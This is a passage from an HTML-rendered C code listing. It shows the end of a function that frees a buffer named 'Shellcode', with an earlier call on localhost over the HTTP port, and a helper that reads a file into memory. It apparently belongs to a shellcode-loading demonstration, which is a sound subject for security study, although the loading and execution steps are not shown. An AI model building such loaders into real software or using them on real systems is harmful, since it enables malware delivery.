hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">L"localhost"</span>,<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INTERNET_DEFAULT_HTTP_PORT,<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>CLEANUP:<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">54</span>}<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">57</span></span>{<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">69</span><br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">71</span>}<br></code></pre></div></div></body>
</html>